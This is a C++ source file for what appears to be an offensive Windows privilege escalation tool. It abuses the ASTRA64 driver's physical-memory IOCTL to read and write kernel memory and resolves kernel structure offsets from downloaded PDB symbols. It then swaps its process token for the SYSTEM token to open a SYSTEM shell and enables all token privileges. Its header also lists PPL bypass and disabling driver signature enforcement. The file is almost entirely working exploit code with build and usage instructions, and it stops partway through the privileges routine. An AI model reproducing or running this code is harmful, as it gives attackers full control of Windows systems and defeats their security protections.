/*
 * 5_full_chain.cpp — ASTRA64 LPE, zero hardcoded offsets
 *
 * Thay the toan bo detect_ep_offsets() + TOKEN_PRIVS_OFF + EP_PROT_* bang
 * PDB symbol resolution dong tai runtime:
 *   - EnumDeviceDrivers      -> nt_kbase
 *   - msdl.microsoft.com     -> ntoskrnl.pdb (cache in %TEMP%)
 *   - DbgHelp SymGetTypeInfo -> _EPROCESS / _TOKEN field offsets
 *   - DbgHelp SymEnumSymbols -> PsInitialSystemProcess RVA
 *                              (loai bo load_image + export_rva)
 *
 * Techniques:
 *   token  — DKOM token swap -> SYSTEM shell
 *   priv   — Enable all 64 privilege bits
 *   ppl    — Clear EPROCESS.Protection, OpenProcess PPL, dup token
 *   dse    — Disable ci!g_CiEnabled, load unsigned driver
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:full_chain.exe 5_full_chain.cpp ^
 *      /link kernel32.lib winhttp.lib dbghelp.lib psapi.lib ^
 *            advapi32.lib ntdll.lib user32.lib
 *
 * Usage:
 *   full_chain.exe [token|priv|ppl [proc]|dse [drv_path]]
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <psapi.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")

// ═══════════════════════════════════════════════════════════════════════════════
//  ASTRA64 IOCTLs + constants
// ═══════════════════════════════════════════════════════════════════════════════

#define IOCTL_MAP_PHYS   0x80002008u
#define IOCTL_READ_MSR   0x800020ECu
#define DEVICE_PATH      "\\\\.\\Astra32Device0"
#define IA32_LSTAR       0xC0000082u
#define KUSD_VA          0xFFFFF78000000000ULL
#define EX_FAST_REF_MASK 0xFULL

// DSE default driver (override via argv)
#define DSE_DRIVER_PATH  "C:\\Temp\\unsigned.sys"
#define DSE_DRIVER_SVC   "UnsignedDrv"

static bool is_kptr(uint64_t v) {
    return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  KernelOffsets — resolved at runtime from PDB, no hardcodes
// ═══════════════════════════════════════════════════════════════════════════════

struct KernelOffsets {
    // _EPROCESS fields (byte offsets)
    DWORD eprocess_UniqueProcessId;
    DWORD eprocess_ActiveProcessLinks;
    DWORD eprocess_Token;        // _EX_FAST_REF: ptr & ~0xF = _TOKEN*
    DWORD eprocess_Protection;   // PS_PROTECTION (1 byte)

    // _TOKEN.Privileges = _SEP_TOKEN_PRIVILEGES
    DWORD token_Privileges;      // Present = +0, Enabled = +8

    // Global symbol RVAs (add to nt_kbase at runtime)
    DWORD64 rva_PsInitialSystemProcess;
    DWORD64 rva_PsLoadedModuleList;

    // Runtime kernel base (from EnumDeviceDrivers)
    DWORD64 nt_kbase;

    bool valid;
};

// ═══════════════════════════════════════════════════════════════════════════════
//  PDB resolution pipeline
// ═══════════════════════════════════════════════════════════════════════════════

struct CV_INFO_PDB70 {
    DWORD CvSignature;
    GUID  Signature;
    DWORD Age;
    CHAR  PdbFileName[1];
};

// Step 1: ntoskrnl base + path via EnumDeviceDrivers
static bool GetKernelInfo(PVOID* outBase, char outPath[MAX_PATH]) {
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) || cbNeeded == 0)
        return false;

    DWORD count = cbNeeded / sizeof(LPVOID);
    for (DWORD i = 0; i < count; i++) {
        char name[64] = {};
        GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name));
        if (_stricmp(name, "ntoskrnl.exe") != 0) continue;

        *outBase = drivers[i];
        char sysdir[MAX_PATH];
        GetSystemDirectoryA(sysdir, MAX_PATH);
        snprintf(outPath, MAX_PATH, "%s\\%s", sysdir, name);
        return GetFileAttributesA(outPath) != INVALID_FILE_ATTRIBUTES;
    }
    return false;
}

// Step 2: PE debug directory -> GUID + Age
static DWORD RvaToFileOffset(PVOID base, DWORD rva) {
    auto dos = (PIMAGE_DOS_HEADER)base;
    auto nt  = (PIMAGE_NT_HEADERS64)((BYTE*)base + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
        if (rva >= sec[i].VirtualAddress &&
            rva <  sec[i].VirtualAddress + sec[i].Misc.VirtualSize)
            return sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);
    return 0;
}

static bool GetPdbInfo(const char* pePath, GUID* outGuid, DWORD* outAge,
                       char outName[256]) {
    HANDLE hFile = CreateFileA(pePath, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    HANDLE hMap = CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    CloseHandle(hFile);
    if (!hMap) return false;
    PVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!base) return false;

    bool found = false;
    __try {
        auto dos = (PIMAGE_DOS_HEADER)base;
        auto nt  = (PIMAGE_NT_HEADERS64)((BYTE*)base + dos->e_lfanew);
        auto& dd = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
        if (!dd.VirtualAddress || !dd.Size) __leave;

        auto entry = (PIMAGE_DEBUG_DIRECTORY)((BYTE*)base + RvaToFileOffset(base, dd.VirtualAddress));
        DWORD cnt  = dd.Size / sizeof(IMAGE_DEBUG_DIRECTORY);
        for (DWORD i = 0; i < cnt && !found; i++) {
            if (entry[i].Type != IMAGE_DEBUG_TYPE_CODEVIEW) continue;
            auto cv = (CV_INFO_PDB70*)((BYTE*)base + entry[i].PointerToRawData);
            if (cv->CvSignature != 0x53445352) continue;
            *outGuid = cv->Signature;
            *outAge  = cv->Age;
            strncpy_s(outName, 256, cv->PdbFileName, _TRUNCATE);
            char* sl = strrchr(outName, '\\');
            if (sl) { size_t n = strlen(sl+1)+1; memmove(outName, sl+1, n); }
            found = true;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}

    UnmapViewOfFile(base);
    return found;
}

// Step 3: build symbol server URL
static void FormatGuidAge(const GUID& g, DWORD age, char out[72]) {
    snprintf(out, 72, "%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X%X",
        g.Data1, g.Data2, g.Data3,
        g.Data4[0], g.Data4[1], g.Data4[2], g.Data4[3],
        g.Data4[4], g.Data4[5], g.Data4[6], g.Data4[7], age);
}

// Step 4: WinHTTP download
static bool DownloadPdb(const char* url, const char* dest) {
    wchar_t wUrl[512], wDest[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, url,  -1, wUrl,  512);
    MultiByteToWideChar(CP_ACP, 0, dest, -1, wDest, MAX_PATH);

    HINTERNET hS = WinHttpOpen(L"PdbFetch/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return false;

    URL_COMPONENTS uc = {}; wchar_t host[256]={}, path[512]={};
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = host; uc.dwHostNameLength = 256;
    uc.lpszUrlPath  = path; uc.dwUrlPathLength  = 512;
    WinHttpCrackUrl(wUrl, 0, 0, &uc);

    HINTERNET hC = WinHttpConnect(hS, host, uc.nPort, 0);
    DWORD fl = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hR = hC ? WinHttpOpenRequest(hC, L"GET", path, nullptr,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, fl) : nullptr;

    bool ok = hR &&
              WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
              WinHttpReceiveResponse(hR, nullptr);

    if (ok) {
        DWORD sc=0, scl=sizeof(sc);
        WinHttpQueryHeaders(hR, WINHTTP_QUERY_STATUS_CODE|WINHTTP_QUERY_FLAG_NUMBER,
                            nullptr, &sc, &scl, nullptr);
        ok = (sc == 200);
    }

    if (ok) {
        HANDLE hF = CreateFileW(wDest, GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hF == INVALID_HANDLE_VALUE) { ok = false; }
        else {
            BYTE buf[65536]; DWORD rd;
            LONGLONG total = 0;
            while (WinHttpReadData(hR, buf, sizeof(buf), &rd) && rd)
                { DWORD wr; WriteFile(hF, buf, rd, &wr, nullptr); total += rd; }
            CloseHandle(hF);
            printf("    [+] %lld KB\n", total/1024);
        }
    }

    if (hR) WinHttpCloseHandle(hR);
    if (hC) WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    if (!ok) DeleteFileW(wDest);
    return ok;
}

// Step 5: DbgHelp struct field + global RVA resolution
struct TypeCtx   { const char* name; ULONG id; bool found; };
struct GlobalCtx { const char* name; DWORD64 base, rva; bool found; };

static BOOL CALLBACK OnType(PSYMBOL_INFO si, ULONG, PVOID ud) {
    auto c = (TypeCtx*)ud;
    if (si->Name && _stricmp(si->Name, c->name)==0) { c->id=(ULONG)si->TypeIndex; c->found=true; return FALSE; }
    return TRUE;
}
static BOOL CALLBACK OnSym(PSYMBOL_INFO si, ULONG, PVOID ud) {
    auto c = (GlobalCtx*)ud;
    if (si->Name && strcmp(si->Name, c->name)==0) { c->rva=si->Address-c->base; c->found=true; return FALSE; }
    return TRUE;
}

static DWORD FieldOffset(HANDLE hSym, DWORD64 base, const char* sname, const char* fname) {
    TypeCtx tc{sname,0,false};
    SymEnumTypesByName(hSym, base, sname, OnType, &tc);
    if (!tc.found) { printf("    [-] type '%s' not found\n", sname); return (DWORD)-1; }

    DWORD n=0;
    SymGetTypeInfo(hSym, base, tc.id, TI_GET_CHILDRENCOUNT, &n);
    if (!n) return (DWORD)-1;

    auto kids = (TI_FINDCHILDREN_PARAMS*)malloc(sizeof(TI_FINDCHILDREN_PARAMS) + n*sizeof(ULONG));
    if (!kids) return (DWORD)-1;
    kids->Count=n; kids->Start=0;
    SymGetTypeInfo(hSym, base, tc.id, TI_FINDCHILDREN, kids);

    DWORD result=(DWORD)-1;
    for (DWORD i=0; i<n; i++) {
        WCHAR* wn=nullptr;
        if (!SymGetTypeInfo(hSym, base, kids->ChildId[i], TI_GET_SYMNAME, &wn)) continue;
        char narrow[128];
        WideCharToMultiByte(CP_ACP,0,wn,-1,narrow,sizeof(narrow),nullptr,nullptr);
        LocalFree(wn);
        if (_stricmp(narrow,fname)==0) {
            SymGetTypeInfo(hSym, base, kids->ChildId[i], TI_GET_OFFSET, &result);
            break;
        }
    }
    free(kids);
    return result;
}

static DWORD64 GlobalRva(HANDLE hSym, DWORD64 base, const char* name) {
    GlobalCtx gc{name, base, 0, false};
    SymEnumSymbols(hSym, base, name, OnSym, &gc);
    if (!gc.found) printf("    [-] global '%s' not found\n", name);
    return gc.rva;
}

// Main entry point: resolve all kernel offsets from PDB
KernelOffsets ResolvePdbOffsets() {
    KernelOffsets r = {};

    printf("[*] Locating ntoskrnl...\n");
    PVOID kBase=nullptr; char kPath[MAX_PATH]={};
    if (!GetKernelInfo(&kBase, kPath)) { printf("[-] GetKernelInfo failed\n"); return r; }
    r.nt_kbase = (DWORD64)(uintptr_t)kBase;
    printf("[+] Base : %p\n",  kBase);
    printf("[+] Path : %s\n",  kPath);

    printf("[*] Extracting PDB GUID...\n");
    GUID guid={}; DWORD age=0; char pdbName[256]={};
    if (!GetPdbInfo(kPath, &guid, &age, pdbName))
        { printf("[-] GetPdbInfo failed\n"); return r; }

    char guidAge[72]; FormatGuidAge(guid, age, guidAge);
    printf("[+] PDB  : %s  Key: %s\n", pdbName, guidAge);

    // Cache path
    char tmp[MAX_PATH], cached[MAX_PATH], prefix[256];
    GetTempPathA(MAX_PATH, tmp);
    strncpy_s(prefix, pdbName, _TRUNCATE);
    char* dot = strrchr(prefix, '.'); if (dot) *dot='\0';
    snprintf(cached, MAX_PATH, "%s%s_%s.pdb", tmp, prefix, guidAge);

    if (GetFileAttributesA(cached) == INVALID_FILE_ATTRIBUTES) {
        char url[512];
        snprintf(url, 512, "https://msdl.microsoft.com/download/symbols/%s/%s/%s",
                 pdbName, guidAge, pdbName);
        printf("[*] Downloading PDB...\n    %s\n", url);
        if (!DownloadPdb(url, cached)) { printf("[-] Download failed\n"); return r; }
        printf("[+] Saved: %s\n", cached);
    } else {
        printf("[+] Cache: %s\n", cached);
    }

    printf("[*] Loading PDB symbols...\n");
    HANDLE hSym = GetCurrentProcess();
    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_NO_PROMPTS);
    if (!SymInitialize(hSym, nullptr, FALSE))
        { printf("[-] SymInitialize: %lu\n", GetLastError()); return r; }

    wchar_t wPdb[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, cached, -1, wPdb, MAX_PATH);
    const DWORD64 FAKE_BASE = 0x1000000ULL;
    DWORD64 modBase = SymLoadModuleExW(hSym, nullptr, wPdb, nullptr, FAKE_BASE, 0, nullptr, 0);
    if (!modBase) {
        printf("[-] SymLoadModuleEx: %lu\n", GetLastError());
        SymCleanup(hSym); return r;
    }

    printf("[*] Resolving offsets...\n");
    r.eprocess_UniqueProcessId    = FieldOffset(hSym, modBase, "_EPROCESS", "UniqueProcessId");
    r.eprocess_ActiveProcessLinks = FieldOffset(hSym, modBase, "_EPROCESS", "ActiveProcessLinks");
    r.eprocess_Token              = FieldOffset(hSym, modBase, "_EPROCESS", "Token");
    r.eprocess_Protection         = FieldOffset(hSym, modBase, "_EPROCESS", "Protection");
    r.token_Privileges            = FieldOffset(hSym, modBase, "_TOKEN",    "Privileges");
    r.rva_PsInitialSystemProcess  = GlobalRva  (hSym, modBase, "PsInitialSystemProcess");
    r.rva_PsLoadedModuleList      = GlobalRva  (hSym, modBase, "PsLoadedModuleList");

    SymUnloadModule64(hSym, modBase);
    SymCleanup(hSym);

    r.valid = (r.eprocess_UniqueProcessId    != (DWORD)-1) &&
              (r.eprocess_ActiveProcessLinks != (DWORD)-1) &&
              (r.eprocess_Token              != (DWORD)-1) &&
              (r.eprocess_Protection         != (DWORD)-1) &&
              (r.token_Privileges            != (DWORD)-1) &&
              (r.rva_PsInitialSystemProcess  != 0)         &&
              (r.nt_kbase                    != 0);

    if (r.valid) {
        printf("[+] _EPROCESS: pid=+0x%X links=+0x%X token=+0x%X prot=+0x%X\n",
            r.eprocess_UniqueProcessId, r.eprocess_ActiveProcessLinks,
            r.eprocess_Token, r.eprocess_Protection);
        printf("[+] _TOKEN.Privileges: +0x%X  (Present=+0 Enabled=+8)\n", r.token_Privileges);
        printf("[+] PsInitialSystemProcess RVA = 0x%llX\n", (ULONGLONG)r.rva_PsInitialSystemProcess);
    }
    return r;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ASTRA64 physical memory driver wrapper
// ═══════════════════════════════════════════════════════════════════════════════

#pragma pack(push,1)
struct MAP_INPUT {
    uint32_t interface_type, bus_number;
    uint64_t physical_addr;
    uint32_t address_space, size;
};
#pragma pack(pop)

struct Astra {
    HANDLE   dev    = INVALID_HANDLE_VALUE;
    uint64_t hint_hi = 0;

    bool open() {
        dev = CreateFileA(DEVICE_PATH, GENERIC_READ|GENERIC_WRITE,
                          FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                          OPEN_EXISTING, 0, NULL);
        if (dev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open %s: %lu\n", DEVICE_PATH, GetLastError());
            return false;
        }
        printf("[+] Device: %s\n", DEVICE_PATH);
        return true;
    }
    void close() { if (dev!=INVALID_HANDLE_VALUE){CloseHandle(dev);dev=INVALID_HANDLE_VALUE;} }

    uintptr_t map_page(uint64_t phys) {
        MAP_INPUT in={}; in.physical_addr=phys; in.size=0x1000;
        DWORD ret=0;
        if (!DeviceIoControl(dev,IOCTL_MAP_PHYS,&in,sizeof(in),&in,sizeof(in),&ret,NULL)) return 0;
        uint64_t lo=(uint64_t)(uint32_t)in.interface_type;
        if (!lo) return 0;
        auto try_hi=[&](uint64_t hi)->uintptr_t{
            uint64_t cand=(hi<<32)|lo; MEMORY_BASIC_INFORMATION mbi;
            return (VirtualQuery((LPCVOID)cand,&mbi,sizeof(mbi))>0 && mbi.State==MEM_COMMIT)
                   ?(uintptr_t)cand:0;
        };
        if (auto va=try_hi(hint_hi)) return va;
        for (uint64_t hi=0;hi<0x8000;hi++){if(hi==hint_hi)continue;if(auto va=try_hi(hi)){hint_hi=hi;return va;}}
        return 0;
    }
    void unmap(uintptr_t va){UnmapViewOfFile((LPCVOID)(va&~(uintptr_t)0xFFF));}

    static bool safe_copy(uintptr_t src,void*dst,size_t n){
        SIZE_T rd=0;return ReadProcessMemory(GetCurrentProcess(),(LPCVOID)src,dst,n,&rd)&&rd==n;
    }
    bool read_phys(uint64_t addr,void*buf,size_t len){
        auto*dst=(uint8_t*)buf;
        for(size_t pos=0;pos<len;){
            uint64_t pg=addr&~(uint64_t)0xFFF; size_t off=(size_t)(addr&0xFFF);
            size_t chunk=std::min(len-pos,(size_t)(0x1000-off));
            uintptr_t va=map_page(pg); if(!va) return false;
            bool ok=safe_copy(va+off,dst+pos,chunk); unmap(va);
            if(!ok) return false; pos+=chunk; addr+=chunk;
        }
        return true;
    }
    bool write_phys(uint64_t addr,const void*buf,size_t len){
        auto*src=(const uint8_t*)buf;
        for(size_t pos=0;pos<len;){
            uint64_t pg=addr&~(uint64_t)0xFFF; size_t off=(size_t)(addr&0xFFF);
            size_t chunk=std::min(len-pos,(size_t)(0x1000-off));
            uintptr_t va=map_page(pg); if(!va) return false;
            memcpy((void*)(va+off),src+pos,chunk); unmap(va);
            pos+=chunk; addr+=chunk;
        }
        return true;
    }
    bool read_u8 (uint64_t pa,uint8_t *v){return read_phys(pa,v,1);}
    bool read_u32(uint64_t pa,uint32_t*v){return read_phys(pa,v,4);}
    bool read_u64(uint64_t pa,uint64_t*v){return read_phys(pa,v,8);}
    bool write_u8 (uint64_t pa,uint8_t  v){return write_phys(pa,&v,1);}
    bool write_u32(uint64_t pa,uint32_t v){return write_phys(pa,&v,4);}
    bool write_u64(uint64_t pa,uint64_t v){return write_phys(pa,&v,8);}
};

// ═══════════════════════════════════════════════════════════════════════════════
//  Page table walk (4-level, x64)
// ═══════════════════════════════════════════════════════════════════════════════

static bool virt_to_phys(Astra*d,uint64_t cr3,uint64_t va,uint64_t*pa){
    auto idx=[&](int l){return (va>>(12+l*9))&0x1FF;};
    uint64_t e=0;
    if(!d->read_u64((cr3&0x000FFFFFFFFFF000ULL)+idx(3)*8,&e)||!(e&1)) return false;
    if(!d->read_u64((e  &0x000FFFFFFFFFF000ULL)+idx(2)*8,&e)||!(e&1)) return false;
    if(e&0x80){*pa=(e&0x000FFFFC0000000ULL)|(va&0x3FFFFFFFULL);return true;}
    if(!d->read_u64((e  &0x000FFFFFFFFFF000ULL)+idx(1)*8,&e)||!(e&1)) return false;
    if(e&0x80){*pa=(e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFFULL); return true;}
    if(!d->read_u64((e  &0x000FFFFFFFFFF000ULL)+idx(0)*8,&e)||!(e&1)) return false;
    *pa=(e&0x000FFFFFFFFFF000ULL)|(va&0xFFFULL); return true;
}

static bool vread(Astra*d,uint64_t cr3,uint64_t va,void*buf,size_t len){
    auto*dst=(uint8_t*)buf;
    for(size_t pos=0;pos<len;){
        size_t off=(size_t)(va&0xFFF),chunk=std::min(len-pos,(size_t)(0x1000-off));
        uint64_t pa; if(!virt_to_phys(d,cr3,va,&pa)) return false;
        if(!d->read_phys(pa,dst+pos,chunk)) return false;
        pos+=chunk; va+=chunk;
    }
    return true;
}
static bool vread_u8 (Astra*d,uint64_t cr3,uint64_t va,uint8_t *v){return vread(d,cr3,va,v,1);}
static bool vread_u64(Astra*d,uint64_t cr3,uint64_t va,uint64_t*v){return vread(d,cr3,va,v,8);}

// ═══════════════════════════════════════════════════════════════════════════════
//  CR3 finder
// ═══════════════════════════════════════════════════════════════════════════════

static uint64_t find_cr3(Astra*d){
    const uint64_t idx=(KUSD_VA>>39)&0x1FF;
    printf("[*] Scanning low 64 MB for CR3...\n");
    std::vector<uint64_t> cands;
    for(uint64_t pg=0;pg<0x4000000ULL;pg+=0x1000){
        uint64_t e=0;
        if(!d->read_u64(pg+idx*8,&e)||!(e&1)) continue;
        if((e&0x000FFFFFFFFFF000ULL)>0x80000000ULL) continue;
        cands.push_back(pg);
    }
    printf("[*] %zu candidates, verifying...\n", cands.size());
    for(uint64_t cr3:cands){
        uint64_t pa; uint32_t v=0;
        if(virt_to_phys(d,cr3,KUSD_VA,&pa)&&d->read_u32(pa+0x26C,&v)&&v==10)
            return cr3;
    }
    return 0;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EPROCESS walker — uses PDB offsets directly, no nt_disk needed
// ═══════════════════════════════════════════════════════════════════════════════

static bool find_eprocess(Astra*d, uint64_t cr3, const KernelOffsets& off,
                           uint32_t tgt_pid,
                           uint64_t* sys_ep, uint64_t* tgt_ep) {
    // PsInitialSystemProcess: *(nt_kbase + rva) = System EPROCESS VA
    uint64_t psisp_va = off.nt_kbase + off.rva_PsInitialSystemProcess;
    uint64_t se=0;
    if(!vread_u64(d,cr3,psisp_va,&se)||!is_kptr(se)){
        printf("[-] *PsInitialSystemProcess invalid\n"); return false;
    }
    uint64_t spid=0; vread_u64(d,cr3,se+off.eprocess_UniqueProcessId,&spid);
    if(spid!=4){printf("[-] System PID=%llu\n",(unsigned long long)spid);return false;}
    *sys_ep=se;
    if(tgt_pid==4){*tgt_ep=se;return true;}

    // Walk Blink of System's ActiveProcessLinks (head of circular list)
    uint64_t head=0,flink=0;
    if(!vread_u64(d,cr3,se+off.eprocess_ActiveProcessLinks+8,&head)||!is_kptr(head)) return false;
    if(!vread_u64(d,cr3,head,&flink)) return false;

    for(int i=0;i<4096&&flink!=head;i++){
        uint64_t ep_va=flink-off.eprocess_ActiveProcessLinks;
        uint64_t pid=0;
        if(vread_u64(d,cr3,ep_va+off.eprocess_UniqueProcessId,&pid)&&(uint32_t)pid==tgt_pid){
            *tgt_ep=ep_va; return true;
        }
        uint64_t nxt=0;
        if(!vread_u64(d,cr3,flink,&nxt)||!is_kptr(nxt)) break;
        flink=nxt;
    }
    printf("[-] PID %u not found in EPROCESS list\n",tgt_pid); return false;
}

// Walk all, collect PPL entries (Protection != 0)
struct PplEntry{uint64_t ep_va; uint32_t pid; uint8_t prot; char name[20];};

static std::vector<PplEntry> find_ppl_processes(Astra*d,uint64_t cr3,const KernelOffsets&off){
    std::vector<PplEntry> result;
    uint64_t se=0;
    uint64_t psisp_va=off.nt_kbase+off.rva_PsInitialSystemProcess;
    if(!vread_u64(d,cr3,psisp_va,&se)||!is_kptr(se)) return result;

    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    auto get_name=[&](uint32_t pid)->const char*{
        static char buf[32]; sprintf_s(buf,"pid%u",pid);
        if(snap==INVALID_HANDLE_VALUE) return buf;
        PROCESSENTRY32W pe={sizeof(pe)};
        if(Process32FirstW(snap,&pe)) do {
            if(pe.th32ProcessID==pid){
                WideCharToMultiByte(CP_ACP,0,pe.szExeFile,-1,buf,32,NULL,NULL); return buf;
            }
        } while(Process32NextW(snap,&pe));
        return buf;
    };

    auto add=[&](uint64_t ep_va,uint32_t pid){
        uint8_t prot=0;
        vread_u8(d,cr3,ep_va+off.eprocess_Protection,&prot);
        if(!prot) return;
        PplEntry e{}; e.ep_va=ep_va; e.pid=pid; e.prot=prot;
        strcpy_s(e.name,20,get_name(pid)); result.push_back(e);
    };

    add(se,4); // System process itself

    uint64_t head=0,flink=0;
    vread_u64(d,cr3,se+off.eprocess_ActiveProcessLinks+8,&head);
    vread_u64(d,cr3,head,&flink);
    for(int i=0;i<4096&&flink!=head;i++){
        uint64_t ep_va=flink-off.eprocess_ActiveProcessLinks;
        uint64_t pid=0;
        vread_u64(d,cr3,ep_va+off.eprocess_UniqueProcessId,&pid);
        if(pid) add(ep_va,(uint32_t)pid);
        uint64_t nxt=0;
        if(!vread_u64(d,cr3,flink,&nxt)||!is_kptr(nxt)) break;
        flink=nxt;
    }
    if(snap!=INVALID_HANDLE_VALUE) CloseHandle(snap);
    return result;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  KernelCtx — common state shared by all techniques
// ═══════════════════════════════════════════════════════════════════════════════

struct KernelCtx {
    KernelOffsets off  = {};
    Astra         drv;
    uint64_t      cr3  = 0;
    uint64_t      sys_ep = 0, my_ep = 0;
    uint64_t      pa_sys_tok = 0, pa_my_tok = 0;
    uint64_t      sys_tok = 0, orig_tok = 0;
};

static bool kctx_init(KernelCtx* k) {
    // Step 0: PDB offsets (downloads PDB if needed, ~50 MB first time)
    printf("\n[*] Resolving kernel offsets from PDB...\n");
    k->off = ResolvePdbOffsets();
    if (!k->off.valid) { printf("[-] PDB resolution failed\n"); return false; }
    printf("[+] ntoskrnl base = 0x%llX\n", (ULONGLONG)k->off.nt_kbase);

    // Step 1: open driver
    if (!k->drv.open()) return false;

    // Step 2: find CR3
    k->cr3 = find_cr3(&k->drv);
    if (!k->cr3) { printf("[-] CR3 not found\n"); return false; }
    printf("[+] CR3 = 0x%llX\n", (ULONGLONG)k->cr3);

    // Step 3: walk EPROCESS list (no nt_disk, use PDB RVA directly)
    uint32_t my_pid = GetCurrentProcessId();
    printf("[*] Walking EPROCESS (System + PID %u)...\n", my_pid);
    if (!find_eprocess(&k->drv, k->cr3, k->off, my_pid, &k->sys_ep, &k->my_ep)) return false;
    printf("[+] System EPROCESS = 0x%llX\n", (ULONGLONG)k->sys_ep);
    printf("[+] Our    EPROCESS = 0x%llX\n", (ULONGLONG)k->my_ep);

    // Step 4: translate Token field VA -> PA for both processes
    if (!virt_to_phys(&k->drv, k->cr3, k->sys_ep+k->off.eprocess_Token, &k->pa_sys_tok) ||
        !virt_to_phys(&k->drv, k->cr3, k->my_ep +k->off.eprocess_Token, &k->pa_my_tok)) {
        printf("[-] virt_to_phys token fields failed\n"); return false;
    }
    k->drv.read_u64(k->pa_sys_tok, &k->sys_tok);
    k->drv.read_u64(k->pa_my_tok,  &k->orig_tok);
    return true;
}

static bool do_token_swap(KernelCtx*k){
    printf("[*] Swapping token -> SYSTEM...\n");
    if(!k->drv.write_u64(k->pa_my_tok, k->sys_tok)) return false;
    BOOL elev=FALSE; HANDLE t;
    if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&t)){
        TOKEN_ELEVATION te; DWORD sz=sizeof(te);
        GetTokenInformation(t,TokenElevation,&te,sz,&sz);
        elev=te.TokenIsElevated; CloseHandle(t);
    }
    return !!elev;
}

static void restore_token(KernelCtx*k){
    Astra d2; if(!d2.open()) return;
    uint64_t pa2=0;
    if(virt_to_phys(&d2,k->cr3,k->my_ep+k->off.eprocess_Token,&pa2))
        d2.write_u64(pa2,k->orig_tok);
    d2.close(); printf("[+] Token restored\n");
}

static BOOL spawn_shell(){
    STARTUPINFOA si={sizeof(si)}; PROCESS_INFORMATION pi={};
    char cmd[]="cmd.exe";
    BOOL ok=CreateProcessA(NULL,cmd,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
    if(ok){printf("[+] cmd.exe PID %lu\n",pi.dwProcessId);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    else printf("[-] CreateProcess: %lu\n",GetLastError());
    return ok;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Technique 1: DKOM token swap -> SYSTEM
// ═══════════════════════════════════════════════════════════════════════════════

static int run_token(){
    printf("\n=== Technique 1: DKOM Token Swap ===\n");
    KernelCtx k; if(!kctx_init(&k)) return 1;
    printf("[+] System token = 0x%llX\n",(ULONGLONG)k.sys_tok);
    printf("[+] Our    token = 0x%llX\n",(ULONGLONG)k.orig_tok);
    if(!do_token_swap(&k)){printf("[-] Token swap failed\n");return 1;}
    printf("[+] Elevated — spawning SYSTEM shell\n");
    spawn_shell();
    Sleep(2000); restore_token(&k); return 0;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Technique 2: Enable all 64 privilege bits
// ═══════════════════════════════════════════════════════════════════════════════

static int run_priv(){
    printf("\n=== Technique 2: Enable All Token Privileges ===\n");
    KernelCtx k; if(!kctx_init(&k)) return 1;

    uint64_t tok_ref=0;
    k.drv.read_u64(k.pa_my_tok,&tok_ref);
    uint64_t tok_ptr=tok_ref&~EX_FAST_REF_MASK;
    if(!is_kptr(tok_ptr)){printf("[-] Token ptr invalid\n");return 1;}
    printf("[+] _TOKEN @ 0x%llX\n",(ULONGLONG)tok_ptr);

    // _TOKEN.Privileges.Present = tok_ptr + off.token_Privileges
    // _TOKEN.Privileges.Enabled = tok_ptr + off.token_Privileges + 8
    uint64_t pa_present=0, pa_enabled=0;
    if(!virt_to_phys(&k.drv,k.cr3,tok_ptr+k.off.token_Privileges,  &pa_present)||
       !virt_to_phys(&k.drv,k.cr3,tok_ptr+k.off.token_Privileges+8,&pa_enabled)){
        printf("[-] Cannot translate Privileges fields\n"); return 1;
    }

    uint64_t old_p=0,old_e=0;
    k.drv.read_u64(pa_present,&old_p); k.drv.read_u64(pa_enabled,&old_e);
